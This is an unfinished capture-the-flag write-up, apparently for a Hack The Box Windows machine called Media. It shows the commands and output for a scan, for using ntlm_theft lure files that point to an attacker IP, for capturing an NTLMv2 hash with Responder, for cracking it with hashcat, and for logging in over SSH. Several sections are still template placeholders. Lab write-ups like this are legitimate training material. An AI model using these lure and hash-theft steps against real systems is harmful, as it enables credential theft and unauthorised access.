
| Property         | Value                    |
| ---------------- | ------------------------ |
| **OS**           | Windows                  |
| **Difficulty**   | Medium                   |
| **Release Date** | 4th September, 2025      |
| **State**        | YYYY-MM-DD               |
| **IP**           | 10.10.10.X               |
| **Techniques**   | technique-1, technique-2 |
| **Tags**         | #web #privesc #linux     |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
 nmap -sC -sV media.htb --open  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-26 08:43 EDT
Nmap scan report for media.htb (10.129.234.67)
Host is up (0.031s latency).
Not shown: 997 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-26T12:43:44+00:00
|_ssl-date: 2026-09-26T12:43:53+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2026-09-25T12:26:41
|_Not valid after:  2027-03-27T12:26:41
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.74 seconds

```

### Service Enumeration

```
curl -I http://media.htb 
HTTP/1.1 200 OK
Date: Sat, 26 Sep 2026 13:40:56 GMT
Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
X-Powered-By: PHP/8.1.17
Content-Type: text/html; charset=UTF-8

```

---
## Foothold

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

Step-by-step exploitation with commands.

```shell
git clone https://github.com/Greenwolf/ntlm_theft.git           
Cloning into 'ntlm_theft'...
remote: Enumerating objects: 179, done.
remote: Counting objects: 100% (49/49), done.
remote: Compressing objects: 100% (18/18), done.
remote: Total 179 (delta 41), reused 31 (delta 31), pack-reused 130 (from 1)
Receiving objects: 100% (179/179), 2.13 MiB | 3.18 MiB/s, done.
Resolving deltas: 100% (90/90), done.
                                                                 
```

```
python3 ntlm_theft.py -g all -s 10.10.15.80 -f test
Created: test/test.scf (BROWSE TO FOLDER)
Created: test/test-(url).url (BROWSE TO FOLDER)
Created: test/test-(icon).url (BROWSE TO FOLDER)
Created: test/test.lnk (BROWSE TO FOLDER)
Created: test/test.rtf (OPEN)
Created: test/test-(stylesheet).xml (OPEN)
Created: test/test-(fulldocx).xml (OPEN)
Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(includepicture).docx (OPEN)
Created: test/test-(remotetemplate).docx (OPEN)
Created: test/test-(frameset).docx (OPEN)
Created: test/test-(externalcell).xlsx (OPEN)
Created: test/test.wax (OPEN)
Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: test/test.asx (OPEN)
Created: test/test.jnlp (OPEN)
Created: test/test.application (DOWNLOAD AND OPEN)
Created: test/test.pdf (OPEN AND ALLOW)
Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: test/test.library-ms (BROWSE TO FOLDER)
Created: test/Autorun.inf (BROWSE TO FOLDER)
Created: test/desktop.ini (BROWSE TO FOLDER)
Created: test/test.theme (THEME TO INSTALL)
Created: test/test.bat (BROWSE TO FOLDER)
Generation Complete.

```

```
──(kali㉿kali)-[~/machines/media/ntlm_theft/test]
└─$ ls
 Autorun.inf                 test.htm                     'test-(remotetemplate).docx'
 desktop.ini                'test-(icon).url'              test.rtf
 test.application           'test-(includepicture).docx'   test.scf
 test.asx                    test.jnlp                    'test-(stylesheet).xml'
 test.bat                    test.library-ms               test.theme
'test-(externalcell).xlsx'   test.lnk                     'test-(url).url'
'test-(frameset).docx'       test.m3u                      test.wax
'test-(fulldocx).xml'        test.odt                      zoom-attack-instructions.txt
'test-(handler).htm'         test.pdf
                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/machines/media/ntlm_theft/test]
└─$ cat test.asx
<asx version="3.0">
   <title>Leak</title>
   <entry>
      <title></title>
      <ref href="file://10.10.15.80/leak/leak.wma"/>
   </entry>
</asx>                                                                                                                    

```

```
sudo responder -I tun0
```

uploading the file:
 img1

```
[+] Listening for events...                                                                                         

[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:39d3ee53b1945523:815747E53BD726D4DD787A4C34EF2A64:010100000000000080A572124B4EDD013753815B3269778B0000000002000800540043003700460001001E00570049004E002D0051005000310059005A0030003200510058004B00370004003400570049004E002D0051005000310059005A0030003200510058004B0037002E0054004300370046002E004C004F00430041004C000300140054004300370046002E004C004F00430041004C000500140054004300370046002E004C004F00430041004C000700080080A572124B4EDD0106000400020000000800300030000000000000000000000000300000DCC86B5D2ED14024EFB0540F9689EA58003D50C2E4F6F3F460CB5252F334B5470A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00380030000000000000000000                                                                                              
[*] Skipping previously captured hash for MEDIA\enox

```

cracking hash:

```
 hashcat -m 5600 enox.hash /usr/share/wordlists/rockyou.txt   
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1469/2939 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1431 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ENOX::MEDIA:39d3ee53b1945523:815747e53bd726d4dd787a4c34ef2a64:010100000000000080a572124b4edd013753815b3269778b0000000002000800540043003700460001001e00570049004e002d0051005000310059005a0030003200510058004b00370004003400570049004e002d0051005000310059005a0030003200510058004b0037002e0054004300370046002e004c004f00430041004c000300140054004300370046002e004c004f00430041004c000500140054004300370046002e004c004f00430041004c000700080080a572124b4edd0106000400020000000800300030000000000000000000000000300000dcc86b5d2ed14024efb0540f9689ea58003d50c2e4f6f3f460cb5252f334b5470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e00380030000000000000000000:1234virus@
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ENOX::MEDIA:39d3ee53b1945523:815747e53bd726d4dd787a...000000
Time.Started.....: Sun Sep 27 07:42:52 2026 (7 secs)
Time.Estimated...: Sun Sep 27 07:42:59 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1786.1 kH/s (1.77ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13340672/14344385 (93.00%)
Rejected.........: 0/13340672 (0.00%)
Restore.Point....: 13336576/14344385 (92.97%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 12359331 -> 12345yoyoy
Hardware.Mon.#01.: Util: 81%

Started: Sun Sep 27 07:42:51 2026
Stopped: Sun Sep 27 07:43:01 2026
                                                            
```

enox:1234virus@


### ssh access as enox

```
ssh enox@media.htb      
The authenticity of host 'media.htb (10.129.234.67)' can't be established.
ED25519 key fingerprint is: SHA256:2c17FslY2rzanEFkyjgpzSQoyVlsRgRFVJv+0dkFt8A
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'media.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
enox@media.htb's password: 
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

enox@MEDIA C:\Users\enox>cd 

```


---
## User Flag

```
enox@MEDIA C:\Users\enox\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Users\enox\Desktop

10/02/2023  11:04 AM    <DIR>          .
10/02/2023  10:26 AM    <DIR>          ..
09/27/2026  03:22 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   9,997,946,880 bytes free

enox@MEDIA C:\Users\enox\Desktop>type user.txt
faeaca8e85a7a80cf5f07bd27f4538ec

enox@MEDIA C:\Users\enox\Desktop>

```

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)